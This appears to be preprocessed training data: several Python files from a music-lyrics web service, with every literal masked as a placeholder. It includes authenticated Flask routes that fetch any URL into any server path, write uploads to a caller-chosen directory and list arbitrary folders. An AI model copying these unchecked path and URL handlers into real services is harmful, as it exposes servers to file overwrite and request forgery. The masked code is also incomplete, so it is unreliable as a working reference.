( self . url , headers = self . headers , stream = True ) <EOL> response . raise_for_status ( ) <EOL> for chunk in response . iter_content ( chunk_size = self . chunk_size ) : <EOL> self . file . write ( chunk ) <EOL> @ v1_bp . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" ] ) <EOL> def file_api_download ( ) : <EOL> match require_auth ( request = request , permission = "<STR_LIT>" ) : <EOL> case - <NUM_LIT> : <EOL> return render_template_string ( webui . error ( ) ) , <NUM_LIT> <EOL> case - <NUM_LIT> : <EOL> return render_template_string ( webui . error ( ) ) , <NUM_LIT> <EOL> data = request . json <EOL> if not data : <EOL> return { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : <NUM_LIT> } , <NUM_LIT> <EOL> url = data . get ( "<STR_LIT>" ) <EOL> headers = data . get ( "<STR_LIT>" ) or { "<STR_LIT>" : "<STR_LIT>" } <EOL> save_file = data . get ( "<STR_LIT>" ) <EOL> chunk_size = data . get ( "<STR_LIT>" ) or <NUM_LIT> * <NUM_LIT> <EOL> if not url or not save_file : <EOL> return { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : <NUM_LIT> } , <NUM_LIT> <EOL> if os . path . exists ( save_file ) : <EOL> return { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : <NUM_LIT> } , <NUM_LIT> <EOL> try : <EOL> with Wget ( url , headers , save_file , chunk_size ) as wget : <EOL> wget . download ( ) <EOL> return { "<STR_LIT>" : <NUM_LIT> } , <NUM_LIT> <EOL> except requests . RequestException as e : <EOL> return { "<STR_LIT>" : str ( e ) , "<STR_LIT>" : <NUM_LIT> } , <NUM_LIT> <EOL> @ v1_bp . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def upload_file ( ) : <EOL> match require_auth ( request = request , permission = "<STR_LIT>" ) : <EOL> case - <NUM_LIT> : <EOL> return render_template_string ( webui . error ( ) ) , <NUM_LIT> <EOL> case - <NUM_LIT> : <EOL> return render_template_string ( webui . error ( ) ) , <NUM_LIT> <EOL> if '<STR_LIT>' not in request . files : <EOL> return { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : <NUM_LIT> } , <NUM_LIT> <EOL> file = request . files [ '<STR_LIT>' ] <EOL> filename = secure_filename ( file . filename ) <EOL> directory = request . form . get ( '<STR_LIT>' ) <EOL> chunk_size = int ( request . form . get ( '<STR_LIT>' ) ) <EOL> start_position = int ( request . form . get ( '<STR_LIT>' ) ) <EOL> chunk_hash = request . form . get ( '<STR_LIT>' ) <EOL> if filename == '<STR_LIT>' : <EOL> return { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : <NUM_LIT> } , <NUM_LIT> <EOL> file_content = file . read ( ) <EOL> if hashlib . md5 ( file_content ) . hexdigest ( ) != chunk_hash : <EOL> return { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : <NUM_LIT> } , <NUM_LIT> <EOL> file . seek ( start_position ) <EOL> with open ( os . path . join ( directory , filename ) , '<STR_LIT>' ) as f : <EOL> f . write ( file_content [ : chunk_size ] ) <EOL> return { "<STR_LIT>" : <NUM_LIT> } , <NUM_LIT> <EOL> @ v1_bp . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def list_file ( ) : <EOL> match require_auth ( request = request , permission = "<STR_LIT>" ) : <EOL> case - <NUM_LIT> : <EOL> return render_template_string ( webui . error ( ) ) , <NUM_LIT> <EOL> case - <NUM_LIT> : <EOL> return render_template_string ( webui . error ( ) ) , <NUM_LIT> <EOL> path = request . args . get ( '<STR_LIT>' , os . getcwd ( ) ) <EOL> row = request . args . get ( '<STR_LIT>' , <NUM_LIT> ) <EOL> page = request . args . get ( '<STR_LIT>' , <NUM_LIT> ) <EOL> if not os . path . exists ( path ) : <EOL> return { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : <NUM_LIT> } , <NUM_LIT> <EOL> if not os . path . isdir ( path ) : <EOL> return { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : <NUM_LIT> } , <NUM_LIT> <EOL> data = { <EOL> "<STR_LIT>" : [ page , row ] , <EOL> "<STR_LIT>" : [ ] <EOL> } <EOL> for i in os . listdir ( path ) : <EOL> if os . path . isdir ( os . path . join ( path , i ) ) : <EOL> data [ "<STR_LIT>" ] . append ( { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : i , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : int ( os . path . getctime ( os . path . join ( path , i ) ) ) , <EOL> "<STR_LIT>" : int ( os . path . getmtime ( os . path . join ( path , i ) ) ) , <EOL> "<STR_LIT>" : os . stat ( os . path . join ( path , i ) ) . st_uid , <EOL> "<STR_LIT>" : oct ( os . stat ( os . path . join ( path , i ) ) . st_mode ) [ - <NUM_LIT> : ] <EOL> } ) <EOL> else : <EOL> data [ "<STR_LIT>" ] . append ( { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : i , <EOL> "<STR_LIT>" : os . path . getsize ( os . path . join ( path , i ) ) , <EOL> "<STR_LIT>" : int ( os . path . getctime ( os . path . join ( path , i ) ) ) , <EOL> "<STR_LIT>" : int ( os . path . getmtime ( os . path . join ( path , i ) ) ) , <EOL> "<STR_LIT>" : os . stat ( os . path . join ( path , i ) ) . st_uid , <EOL> "<STR_LIT>" : oct ( os . stat ( os . path . join ( path , i ) ) . st_mode ) [ - <NUM_LIT> : ] <EOL> } ) <EOL> return { <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : data [ "<STR_LIT>" ] , <EOL> "<STR_LIT>" : data [ "<STR_LIT>" ] [ row * ( page - <NUM_LIT> ) : row * page ] <EOL> } <EOL> } <EOL> </s>
<s> import logging <EOL> logger = logging . getLogger ( __name__ ) <EOL> class DebugLogger : <EOL> def __init__ ( self ) : <EOL> self . debug = False <EOL> def log ( self , level , message ) : <EOL> if not self . debug : <EOL> return <EOL> message = f"<STR_LIT>" <EOL> if level == "<STR_LIT>" : <EOL> logger . info ( message ) <EOL> elif level == "<STR_LIT>" : <EOL> logger . warning ( message ) <EOL> elif level == "<STR_LIT>" : <EOL> logger . error ( message ) <EOL> elif level == "<STR_LIT>" : <EOL> if self . debug : <EOL> logger . debug ( message ) <EOL> else : <EOL> logger . info ( message ) <EOL> debugger = DebugLogger ( ) <EOL> </s>
<s> import requests <EOL> from mod import tools <EOL> class MiGuMusicClient : <EOL> BASE_URL = "<STR_LIT>" <EOL> header = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> def fetch_lyric ( self , song_id ) : <EOL> url = f'<STR_LIT>' <EOL> res = requests . get ( url , headers = self . header ) <EOL> return res . json ( ) [ "<STR_LIT>" ] <EOL> def fetch_id3_by_title ( self , title ) : <EOL> url = self . BASE_URL + f"<STR_LIT>" <EOL> res = requests . get ( url , headers = self . header ) <EOL> songs = res . json ( ) [ "<STR_LIT>" ] <EOL> results = [ ] <EOL> for song in songs : <EOL> lyrics = self . fetch_lyric ( song [ '<STR_LIT>' ] ) <EOL> results . append ( { <EOL> "<STR_LIT>" : song [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : song [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : song [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : lyrics , <EOL> "<STR_LIT>" : song [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : tools . calculate_md5 ( <EOL> f"<STR_LIT>" ) <EOL> } ) <EOL> return results <EOL> def search ( title = '<STR_LIT>' , artist = '<STR_LIT>' , album = '<STR_LIT>' ) -> list : <EOL> migumusic = MiGuMusicClient ( ) <EOL> result = migumusic . fetch_id3_by_title ( title ) <EOL> return result <EOL> if __name__ == "<STR_LIT>" : <EOL> print ( search ( title = "<STR_LIT>" ) ) <EOL> </s>
<s> from concurrent import futures <EOL> from mod . searchx import api , kugou <EOL> def search_all ( title , artist , album , timeout = <NUM_LIT> ) : <EOL> funcs = [ api , kugou ] <EOL> results = [ ] <EOL> def request ( task ) : <EOL> res : list = task . search ( title , artist , album ) <EOL> if isinstance ( res , list ) : <EOL> results . extend ( res ) <EOL> with futures . ThreadPoolExecutor ( ) as executor : <EOL> _futures = [ ] <EOL> for func in funcs : <EOL> _futures . append ( executor . submit ( request , func ) ) <EOL> for future in futures . as_completed ( _futures , timeout = timeout ) : <EOL> future . result ( ) <EOL> for future in _futures : <EOL> if future . done ( ) and future . exception ( ) : <EOL> future . result ( ) <EOL> else : <EOL> future . cancel ( ) <EOL> return results <EOL> if __name__ == "<STR_LIT>" : <EOL> print ( search_all ( "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> </s>
<s> ts_dic = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> 